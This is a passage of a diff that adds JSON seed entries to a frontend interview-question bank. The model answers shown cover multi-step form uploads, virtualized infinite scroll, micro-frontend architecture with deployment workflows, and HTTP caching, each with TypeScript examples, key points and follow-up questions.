z.ZodObject<Record<string, z.ZodTypeAny>> {\n  const fields = formSchema.steps.flatMap(step => step.fields);\n  const shape: Record<string, z.ZodTypeAny> = {};\n  \n  for (const field of fields) {\n    shape[field.id] = createFieldSchema(field);\n  }\n  \n  return z.object(shape);\n}\n```\n\n## File Upload Handling\n\n```typescript\ninterface UploadProgress {\n  fileId: string;\n  fileName: string;\n  progress: number;\n  status: 'pending' | 'uploading' | 'complete' | 'error';\n  url?: string;\n  error?: string;\n}\n\nfunction useFileUpload(fieldId: string) {\n  const [uploads, setUploads] = useState<Map<string, UploadProgress>>(new Map());\n  \n  const uploadFile = useCallback(async (file: File) => {\n    const fileId = nanoid();\n    \n    // Add to state\n    setUploads(prev => new Map(prev).set(fileId, {\n      fileId,\n      fileName: file.name,\n      progress: 0,\n      status: 'pending',\n    }));\n    \n    try {\n      // Get presigned URL\n      const { uploadUrl, fileUrl } = await getPresignedUrl(file.name, file.type);\n      \n      // Upload with progress tracking\n      await uploadWithProgress(uploadUrl, file, (progress) => {\n        setUploads(prev => {\n          const updated = new Map(prev);\n          const current = updated.get(fileId)!;\n          updated.set(fileId, { ...current, progress, status: 'uploading' });\n          return updated;\n        });\n      });\n      \n      // Mark complete\n      setUploads(prev => {\n        const updated = new Map(prev);\n        const current = updated.get(fileId)!;\n        updated.set(fileId, { ...current, progress: 100, status: 'complete', url: fileUrl });\n        return updated;\n      });\n      \n      return fileUrl;\n    } catch (error) {\n      setUploads(prev => {\n        const updated = new Map(prev);\n        const current = updated.get(fileId)!;\n        updated.set(fileId, { \n          ...current, \n          status: 'error', \n          error: error instanceof Error ? error.message : 'Upload failed' \n        });\n        return updated;\n      });\n      throw error;\n    }\n  }, []);\n  \n  return { uploads, uploadFile };\n}\n\nasync function uploadWithProgress(\n  url: string,\n  file: File,\n  onProgress: (progress: number) => void\n): Promise<void> {\n  return new Promise((resolve, reject) => {\n    const xhr = new XMLHttpRequest();\n    \n    xhr.upload.addEventListener('progress', (e) => {\n      if (e.lengthComputable) {\n        onProgress(Math.round((e.loaded / e.total) * 100));\n      }\n    });\n    \n    xhr.addEventListener('load', () => {\n      if (xhr.status >= 200 && xhr.status < 300) {\n        resolve();\n      } else {\n        reject(new Error(`Upload failed: ${xhr.status}`));\n      }\n    });\n    \n    xhr.addEventListener('error', () => reject(new Error('Network error')));\n    \n    xhr.open('PUT', url);\n    xhr.send(file);\n  });\n}\n```\n\n## Multi-Step Form Navigation\n\n```typescript\nfunction useMultiStepForm(schema: FormSchema) {\n  const [currentStepIndex, setCurrentStepIndex] = useState(0);\n  const [formData, setFormData] = useState<Record<string, unknown>>({});\n  const [stepErrors, setStepErrors] = useState<Record<number, Record<string, string>>>({});\n  \n  const visibleSteps = useMemo(() => {\n    return schema.steps.filter(step => {\n      if (!step.conditions?.length) return true;\n      return step.conditions.every(c => evaluateCondition(c, formData));\n    });\n  }, [schema.steps, formData]);\n  \n  const currentStep = visibleSteps[currentStepIndex];\n  const isFirstStep = currentStepIndex === 0;\n  const isLastStep = currentStepIndex === visibleSteps.length - 1;\n  \n  const validateCurrentStep = useCallback(() => {\n    const stepFields = currentStep.fields;\n    const stepSchema = z.object(\n      Object.fromEntries(stepFields.map(f => [f.id, createFieldSchema(f)]))\n    );\n    \n    const result = stepSchema.safeParse(formData);\n    \n    if (!result.success) {\n      const errors: Record<string, string> = {};\n      result.error.issues.forEach(issue => {\n        if (issue.path[0]) {\n          errors[issue.path[0].toString()] = issue.message;\n        }\n      });\n      setStepErrors(prev => ({ ...prev, [currentStepIndex]: errors }));\n      return false;\n    }\n    \n    setStepErrors(prev => ({ ...prev, [currentStepIndex]: {} }));\n    return true;\n  }, [currentStep, currentStepIndex, formData]);\n  \n  const goNext = useCallback(() => {\n    if (validateCurrentStep() && !isLastStep) {\n      setCurrentStepIndex(prev => prev + 1);\n    }\n  }, [validateCurrentStep, isLastStep]);\n  \n  const goPrev = useCallback(() => {\n    if (!isFirstStep) {\n      setCurrentStepIndex(prev => prev - 1);\n    }\n  }, [isFirstStep]);\n  \n  return {\n    currentStep,\n    currentStepIndex,\n    visibleSteps,\n    formData,\n    setFormData,\n    stepErrors: stepErrors[currentStepIndex] ?? {},\n    isFirstStep,\n    isLastStep,\n    goNext,\n    goPrev,\n    validateCurrentStep,\n  };\n}\n```\n\n## Key Architecture Decisions\n\n1. **Schema-Driven**: Form definition is pure data, enabling storage and reuse\n2. **Dynamic Validation**: Zod schemas generated at runtime from field definitions\n3. **Isolated File Uploads**: Each file uploads independently with progress tracking\n4. **Conditional Logic**: Evaluated on every form value change\n5. **Step Validation**: Validates only visible fields in current step",
+      "keyPoints": [
+        "Uses schema-driven architecture for flexibility",
+        "Implements dynamic Zod schema generation",
+        "Handles conditional logic with evaluation engine",
+        "Manages file uploads with progress tracking",
+        "Separates step validation from form validation"
+      ],
+      "followUpQuestions": [
+        "How would you handle autosave for partially completed forms?",
+        "How would you implement form analytics to track drop-off points?",
+        "How would you support offline form completion?",
+        "How would you make the form builder itself accessible?"
+      ],
+      "relatedTopics": [
+        "form-validation",
+        "zod",
+        "file-upload",
+        "conditional-logic"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Typeform",
+        "JotForm",
+        "Airtable"
+      ],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z",
+      "isArchived": false
+    },
+    {
+      "id": "system-design-005",
+      "category": "system-design",
+      "difficulty": "mid",
+      "question": "Explain how you would implement infinite scroll in a way that handles tens of thousands of items efficiently. What are the trade-offs compared to pagination?",
+      "answer": "## Overview\n\nInfinite scroll for large datasets requires virtualization - only rendering items that are visible in the viewport plus a buffer zone. This prevents DOM node explosion while maintaining scroll physics.\n\n## Virtualization Implementation\n\n```typescript\nimport { useVirtualizer } from '@tanstack/react-virtual';\nimport { useInfiniteQuery } from '@tanstack/react-query';\n\ninterface Item {\n  id: string;\n  title: string;\n  // ... other fields\n}\n\nfunction VirtualizedInfiniteList() {\n  const parentRef = useRef<HTMLDivElement>(null);\n  \n  // Fetch data in pages\n  const {\n    data,\n    fetchNextPage,\n    hasNextPage,\n    isFetchingNextPage,\n  } = useInfiniteQuery({\n    queryKey: ['items'],\n    queryFn: async ({ pageParam = 0 }) => {\n      const response = await fetch(`/api/items?cursor=${pageParam}&limit=50`);\n      return response.json() as Promise<{ items: Item[]; nextCursor: string | null }>;\n    },\n    getNextPageParam: (lastPage) => lastPage.nextCursor,\n    initialPageParam: 0,\n  });\n  \n  // Flatten all pages into single array\n  const allItems = useMemo(\n    () => data?.pages.flatMap(page => page.items) ?? [],\n    [data]\n  );\n  \n  // Virtual list configuration\n  const virtualizer = useVirtualizer({\n    count: hasNextPage ? allItems.length + 1 : allItems.length,\n    getScrollElement: () => parentRef.current,\n    estimateSize: () => 72, // Estimated row height\n    overscan: 5, // Render 5 extra items above/below viewport\n  });\n  \n  const virtualItems = virtualizer.getVirtualItems();\n  \n  // Trigger fetch when approaching end\n  useEffect(() => {\n    const lastItem = virtualItems[virtualItems.length - 1];\n    \n    if (\n      lastItem &&\n      lastItem.index >= allItems.length - 1 &&\n      hasNextPage &&\n      !isFetchingNextPage\n    ) {\n      fetchNextPage();\n    }\n  }, [virtualItems, allItems.length, hasNextPage, isFetchingNextPage, fetchNextPage]);\n  \n  return (\n    <div\n      ref={parentRef}\n      className=\"h-[600px] overflow-auto\"\n    >\n      <div\n        style={{\n          height: virtualizer.getTotalSize(),\n          width: '100%',\n          position: 'relative',\n        }}\n      >\n        {virtualItems.map((virtualRow) => {\n          const isLoaderRow = virtualRow.index >= allItems.length;\n          const item = allItems[virtualRow.index];\n          \n          return (\n            <div\n              key={virtualRow.key}\n              data-index={virtualRow.index}\n              ref={virtualizer.measureElement}\n              style={{\n                position: 'absolute',\n                top: 0,\n                left: 0,\n                width: '100%',\n                transform: `translateY(${virtualRow.start}px)`,\n              }}\n            >\n              {isLoaderRow ? (\n                <LoadingSpinner />\n              ) : (\n                <ItemRow item={item} />\n              )}\n            </div>\n          );\n        })}\n      </div>\n    </div>\n  );\n}\n```\n\n## Variable Height Items\n\n```typescript\n// For items with unpredictable heights (images, text)\nconst virtualizer = useVirtualizer({\n  count: items.length,\n  getScrollElement: () => parentRef.current,\n  // Dynamic measurement instead of fixed estimate\n  estimateSize: useCallback((index) => {\n    // Return cached size if measured, estimate otherwise\n    return measuredSizes.current.get(index) ?? 100;\n  }, []),\n  measureElement: (element) => {\n    // Measure actual rendered height\n    return element.getBoundingClientRect().height;\n  },\n});\n\n// Handle resize\nuseEffect(() => {\n  const observer = new ResizeObserver((entries) => {\n    for (const entry of entries) {\n      const index = Number(entry.target.dataset.index);\n      const height = entry.contentRect.height;\n      \n      if (measuredSizes.current.get(index) !== height) {\n        measuredSizes.current.set(index, height);\n        virtualizer.measure(); // Re-calculate positions\n      }\n    }\n  });\n  \n  // Observe all rendered items\n  const elements = parentRef.current?.querySelectorAll('[data-index]');\n  elements?.forEach(el => observer.observe(el));\n  \n  return () => observer.disconnect();\n}, [virtualItems]);\n```\n\n## Scroll Position Restoration\n\n```typescript\nfunction useScrollRestoration(key: string) {\n  const parentRef = useRef<HTMLDivElement>(null);\n  \n  // Save scroll position on unmount\n  useEffect(() => {\n    const element = parentRef.current;\n    \n    return () => {\n      if (element) {\n        sessionStorage.setItem(\n          `scroll-${key}`,\n          JSON.stringify({ top: element.scrollTop })\n        );\n      }\n    };\n  }, [key]);\n  \n  // Restore scroll position on mount\n  useLayoutEffect(() => {\n    const saved = sessionStorage.getItem(`scroll-${key}`);\n    if (saved && parentRef.current) {\n      const { top } = JSON.parse(saved);\n      parentRef.current.scrollTop = top;\n    }\n  }, [key]);\n  \n  return parentRef;\n}\n```\n\n## Trade-offs: Infinite Scroll vs Pagination\n\n| Aspect | Infinite Scroll | Pagination |\n|--------|-----------------|------------|\n| **User Engagement** | Higher - seamless browsing | Lower - requires clicks |\n| **Performance** | Requires virtualization | Simpler, fixed DOM size |\n| **Deep Linking** | Difficult - no stable URLs | Easy - page URLs |\n| **SEO** | Poor without SSR | Excellent |\n| **Memory** | Can grow unbounded | Fixed per page |\n| **Footer Access** | Impossible with infinite content | Easy |\n| **Accessibility** | Complex focus management | Standard navigation |\n| **Back Button** | Breaks without state management | Works naturally |\n\n## When to Use Each\n\n**Infinite Scroll:**\n- Social feeds (Twitter, Instagram)\n- Image galleries\n- Chat/messaging\n- Discovery-focused browsing\n\n**Pagination:**\n- Search results\n- Admin dashboards\n- Data tables\n- E-commerce product listings\n- Content that needs deep linking\n\n## Hybrid Approach: \"Load More\"\n\n```typescript\n// Best of both worlds\nfunction LoadMoreList() {\n  const [page, setPage] = useState(1);\n  const { data, isLoading } = useQuery({\n    queryKey: ['items', page],\n    queryFn: () => fetchItems(page),\n  });\n  \n  return (\n    <div>\n      {data?.items.map(item => (\n        <ItemRow key={item.id} item={item} />\n      ))}\n      \n      {data?.hasMore && (\n        <button\n          onClick={() => setPage(p => p + 1)}\n          disabled={isLoading}\n        >\n          {isLoading ? 'Loading...' : 'Load More'}\n        </button>\n      )}\n    </div>\n  );\n}\n```\n\n## Performance Considerations\n\n1. **Overscan**: Render extra items outside viewport to prevent flashing\n2. **Key Stability**: Use stable item IDs, not array indices\n3. **Debounce Scroll**: Don't fetch on every scroll event\n4. **Memory Limits**: Consider evicting old pages when list grows too large\n5. **Skeleton Loading**: Show placeholders during fetch",
+      "keyPoints": [
+        "Understands virtualization is essential for large lists",
+        "Knows TanStack Virtual or similar libraries",
+        "Can implement scroll position restoration",
+        "Articulates trade-offs between approaches",
+        "Considers accessibility implications",
+        "Mentions hybrid \"load more\" pattern"
+      ],
+      "followUpQuestions": [
+        "How would you handle items that expand/collapse with variable heights?",
+        "How would you implement \"jump to\" functionality in a virtualized list?",
+        "What if items can be reordered by the user?",
+        "How would you handle infinite scroll with filters that change the dataset?"
+      ],
+      "relatedTopics": [
+        "virtualization",
+        "pagination",
+        "intersection-observer",
+        "performance"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Meta",
+        "Twitter",
+        "Pinterest"
+      ],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z",
+      "isArchived": false
+    },
+    {
+      "id": "system-design-006",
+      "category": "system-design",
+      "difficulty": "senior",
+      "question": "Design a micro-frontend architecture for a large e-commerce platform where different teams own different parts of the application (product catalog, cart, checkout, user account). How would you handle shared state, routing, and deployments?",
+      "answer": "## Overview\n\nMicro-frontends allow independent teams to develop, test, and deploy their features autonomously. The key challenges are shared state, consistent UX, and performance optimization across module boundaries.\n\n## Architecture Options\n\n### 1. Module Federation (Recommended for React)\n\n```javascript\n// webpack.config.js - Shell Application\nconst { ModuleFederationPlugin } = require('webpack').container;\n\nmodule.exports = {\n  plugins: [\n    new ModuleFederationPlugin({\n      name: 'shell',\n      remotes: {\n        catalog: 'catalog@https://catalog.example.com/remoteEntry.js',\n        cart: 'cart@https://cart.example.com/remoteEntry.js',\n        checkout: 'checkout@https://checkout.example.com/remoteEntry.js',\n        account: 'account@https://account.example.com/remoteEntry.js',\n      },\n      shared: {\n        react: { singleton: true, requiredVersion: '^18.0.0' },\n        'react-dom': { singleton: true, requiredVersion: '^18.0.0' },\n        '@company/design-system': { singleton: true },\n      },\n    }),\n  ],\n};\n\n// webpack.config.js - Catalog Micro-frontend\nmodule.exports = {\n  plugins: [\n    new ModuleFederationPlugin({\n      name: 'catalog',\n      filename: 'remoteEntry.js',\n      exposes: {\n        './ProductList': './src/components/ProductList',\n        './ProductDetail': './src/pages/ProductDetail',\n        './SearchBar': './src/components/SearchBar',\n      },\n      shared: {\n        react: { singleton: true, requiredVersion: '^18.0.0' },\n        'react-dom': { singleton: true, requiredVersion: '^18.0.0' },\n      },\n    }),\n  ],\n};\n```\n\n### 2. Shell Application Structure\n\n```typescript\n// Shell app - handles routing and composition\nimport { lazy, Suspense } from 'react';\nimport { BrowserRouter, Routes, Route } from 'react-router-dom';\n\n// Dynamic imports from federated modules\nconst ProductList = lazy(() => import('catalog/ProductList'));\nconst ProductDetail = lazy(() => import('catalog/ProductDetail'));\nconst Cart = lazy(() => import('cart/CartPage'));\nconst Checkout = lazy(() => import('checkout/CheckoutFlow'));\nconst Account = lazy(() => import('account/AccountDashboard'));\n\nfunction App() {\n  return (\n    <BrowserRouter>\n      <GlobalProviders>\n        <Header />\n        <ErrorBoundary fallback={<ErrorPage />}>\n          <Suspense fallback={<PageSkeleton />}>\n            <Routes>\n              <Route path=\"/products\" element={<ProductList />} />\n              <Route path=\"/products/:id\" element={<ProductDetail />} />\n              <Route path=\"/cart\" element={<Cart />} />\n              <Route path=\"/checkout/*\" element={<Checkout />} />\n              <Route path=\"/account/*\" element={<Account />} />\n            </Routes>\n          </Suspense>\n        </ErrorBoundary>\n        <Footer />\n      </GlobalProviders>\n    </BrowserRouter>\n  );\n}\n```\n\n## Shared State Management\n\n### Event Bus Pattern\n\n```typescript\n// Shared event bus for cross-module communication\ntype EventMap = {\n  'cart:item-added': { productId: string; quantity: number };\n  'cart:item-removed': { productId: string };\n  'cart:updated': { itemCount: number; total: number };\n  'user:logged-in': { userId: string };\n  'user:logged-out': undefined;\n};\n\nclass EventBus {\n  private listeners = new Map<string, Set<Function>>();\n\n  emit<K extends keyof EventMap>(event: K, data: EventMap[K]) {\n    const handlers = this.listeners.get(event);\n    handlers?.forEach(handler => handler(data));\n  }\n\n  on<K extends keyof EventMap>(\n    event: K,\n    handler: (data: EventMap[K]) => void\n  ): () => void {\n    if (!this.listeners.has(event)) {\n      this.listeners.set(event, new Set());\n    }\n    this.listeners.get(event)!.add(handler);\n    \n    return () => this.listeners.get(event)?.delete(handler);\n  }\n}\n\n// Singleton instance shared across modules\nexport const eventBus = new EventBus();\n\n// Usage in Cart module\neventBus.emit('cart:item-added', { productId: '123', quantity: 2 });\n\n// Usage in Header component (Shell)\nuseEffect(() => {\n  return eventBus.on('cart:updated', ({ itemCount }) => {\n    setCartBadge(itemCount);\n  });\n}, []);\n```\n\n### Shared State Store\n\n```typescript\n// @company/shared-state package\nimport { create } from 'zustand';\nimport { subscribeWithSelector } from 'zustand/middleware';\n\ninterface SharedState {\n  // Cart state\n  cart: {\n    items: CartItem[];\n    total: number;\n  };\n  \n  // User state\n  user: {\n    isAuthenticated: boolean;\n    profile: UserProfile | null;\n  };\n  \n  // Actions\n  addToCart: (item: CartItem) => void;\n  removeFromCart: (productId: string) => void;\n  setUser: (user: UserProfile | null) => void;\n}\n\n// Create store with persistence\nexport const useSharedStore = create<SharedState>()(\n  subscribeWithSelector(\n    persist(\n      (set) => ({\n        cart: { items: [], total: 0 },\n        user: { isAuthenticated: false, profile: null },\n        \n        addToCart: (item) =>\n          set((state) => {\n            const items = [...state.cart.items, item];\n            return {\n              cart: {\n                items,\n                total: items.reduce((sum, i) => sum + i.price * i.quantity, 0),\n              },\n            };\n          }),\n          \n        removeFromCart: (productId) =>\n          set((state) => {\n            const items = state.cart.items.filter(i => i.productId !== productId);\n            return {\n              cart: {\n                items,\n                total: items.reduce((sum, i) => sum + i.price * i.quantity, 0),\n              },\n            };\n          }),\n          \n        setUser: (profile) =>\n          set({\n            user: {\n              isAuthenticated: !!profile,\n              profile,\n            },\n          }),\n      }),\n      { name: 'shared-state' }\n    )\n  )\n);\n\n// Selector hooks for specific slices\nexport const useCart = () => useSharedStore((state) => state.cart);\nexport const useUser = () => useSharedStore((state) => state.user);\n```\n\n## Routing Strategy\n\n```typescript\n// Shell owns top-level routes, delegates to micro-frontends\n// Each micro-frontend handles its own sub-routes\n\n// Checkout micro-frontend internal routing\nfunction CheckoutFlow() {\n  return (\n    <Routes>\n      <Route index element={<ShippingStep />} />\n      <Route path=\"payment\" element={<PaymentStep />} />\n      <Route path=\"review\" element={<ReviewStep />} />\n      <Route path=\"confirmation/:orderId\" element={<Confirmation />} />\n    </Routes>\n  );\n}\n\n// Cross-module navigation\nimport { useNavigate } from 'react-router-dom';\n\nfunction AddToCartButton({ product }: { product: Product }) {\n  const navigate = useNavigate();\n  const addToCart = useSharedStore((s) => s.addToCart);\n  \n  const handleClick = () => {\n    addToCart({\n      productId: product.id,\n      name: product.name,\n      price: product.price,\n      quantity: 1,\n    });\n    \n    // Navigate to cart (owned by different team)\n    navigate('/cart');\n  };\n  \n  return <button onClick={handleClick}>Add to Cart</button>;\n}\n```\n\n## Deployment Strategy\n\n```yaml\n# Each micro-frontend has independent CI/CD\n# Shell monitors health of all remotes\n\n# catalog-deploy.yml\nname: Deploy Catalog\non:\n  push:\n    branches: [main]\n    paths:\n      - 'apps/catalog/**'\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      \n      - name: Build\n        run: |\n          cd apps/catalog\n          npm ci\n          npm run build\n          \n      - name: Deploy to CDN\n        run: |\n          aws s3 sync dist/ s3://mfe-catalog/\n          aws cloudfront create-invalidation --distribution-id ${{ secrets.CF_DIST_ID }}\n          \n      - name: Health Check\n        run: |\n          curl -f https://catalog.example.com/remoteEntry.js || exit 1\n          \n      - name: Notify Shell\n        run: |\n          # Optional: trigger shell to update remote version\n          curl -X POST https://shell.example.com/api/mfe-updated \\\n            -d '{\"module\": \"catalog\", \"version\": \"${{ github.sha }}\"}'\n```\n\n## Version Management\n\n```typescript\n// Dynamic remote loading with version control\nasync function loadRemote(moduleName: string) {\n  // Fetch current versions from config service\n  const config = await fetch('/api/mfe-config').then(r => r.json());\n  const remoteUrl = config.remotes[moduleName];\n  \n  // Dynamically inject script\n  await new Promise<void>((resolve, reject) => {\n    const script = document.createElement('script');\n    script.src = remoteUrl;\n    script.onload = () => resolve();\n    script.onerror = () => reject(new Error(`Failed to load ${moduleName}`));\n    document.head.appendChild(script);\n  });\n  \n  // Access federated module\n  // @ts-expect-error - dynamic federation\n  return window[moduleName];\n}\n\n// Graceful degradation\nfunction MicroFrontendLoader({ \n  module, \n  fallback \n}: { \n  module: string; \n  fallback: React.ReactNode;\n}) {\n  const [Component, setComponent] = useState<React.ComponentType | null>(null);\n  const [error, setError] = useState<Error | null>(null);\n  \n  useEffect(() => {\n    loadRemote(module)\n      .then((remote) => setComponent(() => remote.default))\n      .catch(setError);\n  }, [module]);\n  \n  if (error) return <>{fallback}</>;\n  if (!Component) return <LoadingSpinner />;\n  \n  return <Component />;\n}\n```\n\n## Key Considerations\n\n1. **Shared Dependencies**: Use singleton pattern for React, design system\n2. **CSS Isolation**: CSS Modules or CSS-in-JS with unique prefixes\n3. **Error Boundaries**: Isolate failures to individual micro-frontends\n4. **Performance**: Lazy load micro-frontends, shared chunks for common code\n5. **Testing**: Contract tests between shell and micro-frontends\n6. **Monitoring**: Track load times, errors per micro-frontend",
+      "keyPoints": [
+        "Understands Module Federation mechanics",
+        "Can design event-based cross-module communication",
+        "Knows shared state patterns (store vs event bus)",
+        "Considers independent deployment strategies",
+        "Addresses version management and rollback",
+        "Mentions error boundaries for isolation"
+      ],
+      "followUpQuestions": [
+        "How would you handle a micro-frontend that needs to be SSR'd?",
+        "What if two teams need to share a complex component?",
+        "How would you implement feature flags across micro-frontends?",
+        "How do you ensure consistent styling across teams?"
+      ],
+      "relatedTopics": [
+        "module-federation",
+        "webpack",
+        "deployment",
+        "state-management"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Amazon",
+        "IKEA",
+        "Spotify",
+        "Zalando"
+      ],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z",
+      "isArchived": false
+    },
+    {
+      "id": "caching-memoization-001",
+      "category": "caching-memoization",
+      "difficulty": "senior",
+      "question": "Explain the complete HTTP caching lifecycle. How do Cache-Control headers work, and what's the difference between browser cache, CDN cache, and application-level cache?",
+      "answer": "## HTTP Caching Lifecycle\n\n### 1. Cache-Control Headers Deep Dive\n\n```\nClient Request\n     â”‚\n     â–¼\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     Cache Miss      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚   Browser   â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–º â”‚     CDN     â”‚\nâ”‚    Cache    â”‚                     â”‚    Cache    â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n     â”‚ Cache Hit                          â”‚ Cache Miss\n     â–¼                                    â–¼\n  Response                          â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\n                                    â”‚   Origin    â”‚\n                                    â”‚   Server    â”‚\n                                    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n### Cache-Control Directives\n\n```http\n# Maximum caching - static assets with hash in filename\nCache-Control: public, max-age=31536000, immutable\n\n# API responses - no caching\nCache-Control: no-store\n\n# Dynamic pages - cache but revalidate\nCache-Control: private, no-cache, must-revalidate\n\n# Shared cache (CDN) different from browser\nCache-Control: public, max-age=60, s-maxage=3600, stale-while-revalidate=86400\n```\n\n**Directive meanings:**\n\n| Directive | Meaning |\n|-----------|---------|\n| `public` | Can be cached by CDN and browser |\n| `private` | Only browser can cache (user-specific data) |\n| `max-age=N` | Fresh for N seconds |\n| `s-maxage=N` | CDN-specific max-age (overrides max-age for shared caches) |\n| `no-cache` | Must revalidate with server before using |\n| `no-store` | Never cache (sensitive data) |\n| `must-revalidate` | Don't serve stale on error |\n| `stale-while-revalidate=N` | Serve stale while fetching fresh in background |\n| `immutable` | Content will never change (skip revalidation) |\n\n### 2. ETag and Conditional Requests\n\n```typescript\n// Server generates ETag from content hash\napp.get('/api/user/:id', async (req, res) => {\n  const user = await getUser(req.params.id);\n  const etag = crypto\n    .createHash('md5')\n    .update(JSON.stringify(user))\n    .digest('hex');\n  \n  // Check if client has current version\n  if (req.headers['if-none-match'] === etag) {\n    return res.status(304).end(); // Not Modified\n  }\n  \n  res.set({\n    'ETag': etag,\n    'Cache-Control': 'private, no-cache',\n  });\n  res.json(user);\n});\n```\n\n**Conditional request flow:**\n1. First request: Server returns data + ETag\n2. Browser caches response with ETag\n3. Subsequent requests: Browser sends `If-None-Match: <etag>`\n4. Server compares ETags:\n   - Match â†’ 304 Not Modified (no body)\n   - No match â†’ 200 with new data + new ETag\n\n### 3. Three Layers of Caching\n\n#### Browser Cache (Private)\n\n```typescript\n// Service Worker for fine-grained control\nself.addEventListener('fetch', (event) => {\n  event.respondWith(\n    caches.match(event.request).then((cached) => {\n      // Cache-first strategy\n      if (cached) {\n        // Update cache in background\n        fetch(event.request).then((response) => {\n          caches.open('v1').then((cache) => {\n            cache.put(event.request, response);\n          });\n        });\n        return cached;\n      }\n      \n      // Network fallback\n      return fetch(event.request);\n    })\n  );\n});\n```\n\n#### CDN Cache (Shared)\n\n```typescript\n// Next.js ISR - CDN + Origin coordination\nexport const revalidate = 60; // Revalidate every 60 seconds\n\nexport default async function ProductPage({ params }: { params: { id: string } }) {\n  const product = await getProduct(params.id);\n  \n  // This page will be:\n  // 1. Generated at build time\n  // 2. Served from CDN cache\n  // 3. Revalidated in background after 60s\n  \n  return <ProductDetails product={product} />;\n}\n```\n\n#### Application Cache (In-Memory)\n\n```typescript\n// React Query with stale-while-revalidate pattern\nconst { data: user } = useQuery({\n  queryKey: ['user', userId],\n  queryFn: () => fetchUser(userId),\n  staleTime: 5 * 60 * 1000, // Fresh for 5 minutes\n  gcTime: 30 * 60 * 1000, // Keep in memory for 30 minutes\n});\n\n// Manual cache with Map\nconst cache = new Map<string, { data: unknown; timestamp: number }>();\nconst TTL = 60_000; // 1 minute\n\nasync function cachedFetch<T>(key: string, fetcher: () => Promise<T>): Promise<T> {\n  const cached = cache.get(key);\n  \n  if (cached && Date.now() - cached.timestamp < TTL) {\n    return cached.data as T;\n  }\n  \n  const data = await fetcher();\n  cache.set(key, { data, timestamp: Date.now() });\n  \n  return data;\n}\n```\n\n### 4. Cache Invalidation Strategies\n\n```typescript\n// 1. Time-based (TTL)\nCache-Control: max-age=3600\n\n// 2. Version-based (Cache busting)\n<script src=\"/app.js?v=1.2.3\"></script>\n<script src=\"/app.a1b2c3d4.js\"></script> // Content hash\n\n// 3. Event-based (Webhooks)\nasync function handleProductUpdate(productId: string) {\n  // Purge CDN cache\n  await fetch('https://api.cdn.com/purge', {\n    method: 'POST',\n    body: JSON.stringify({ paths: [`/products/${productId}`] }),\n  });\n  \n  // Invalidate React Query cache\n  queryClient.invalidateQueries({ queryKey: ['product', productId] });\n}\n\n// 4. Tag-based (Surrogate keys)\n// Response header: Surrogate-Key: product-123 category-shoes\n// Purge all products in category: purge tag \"category-shoes\"\n```\n\n### 5. Common Caching Patterns\n\n```typescript\n// Stale-While-Revalidate in JavaScript\nasync function swr<T>(\n  key: string,\n  fetcher: () => Promise<T>,\n  options: { staleTime: number; revalidate: boolean } = { staleTime: 60000, revalidate: true }\n): Promise<T> {\n  const cached = cache.get(key);\n  const now = Date.now();\n  \n  // Return stale data immediately if available\n  if (cached) {\n    const isStale = now - cached.timestamp > options.staleTime;\n    \n    if (isStale && options.revalidate) {\n      // Revalidate in background (don't await)\n      fetcher().then(data => {\n        cache.set(key, { data, timestamp: Date.now() });\n      });\n    }\n    \n    return cached.data as T;\n  }\n  \n  // No cache - fetch and wait\n  const data = await fetcher();\n  cache.set(key, { data, timestamp: now });\n  return data;\n}\n```\n\n## Key Differences Summary\n\n| Aspect | Browser Cache | CDN Cache | App Cache |\n|--------|---------------|-----------|-----------|\n| **Location** | User's device | Edge servers | App memory/DB |\n| **Scope** | Single user | All users | Configurable |\n| **Control** | Cache-Control headers | CDN config + headers | Application code |\n| **Invalidation** | Headers, versioning | Purge API, TTL | Manual, events |\n| **Use case** | Static assets, user data | Global static content | Computed data, API responses |",
+      "keyPoints": [
+        "Understands all Cache-Control directives",
+        "Knows ETag/conditional request flow",
+        "Can explain three cache layers and their purposes",
+        "Understands stale-while-revalidate pattern",
+        "Knows cache invalidation strategies",
+        "Can implement cache in JavaScript"
+      ],
+      "followUpQuestions": [
+        "When would you use no-cache vs no-store?",
+        "How do you handle cache invalidation for user-specific data?",
+        "What's the tradeoff between long max-age and cache busting?",
+        "How would you implement offline-first caching?"
+      ],
+      "relatedTopics": [
+        "http-headers",
+        "cdn",
+        "service-worker",
+        "react-query"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Cloudflare",
+        "Vercel",
+        "Netflix"
+      ],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z",
+      "isArchived": false
+    },
+    {
+      "id": "caching-memoization-002",
+      "category": "caching-memoization",
+      "difficulty": "mid",
+      "question": "What's the difference between useMemo and useCallback in React? When would you use each, and what are the common pitfalls?",
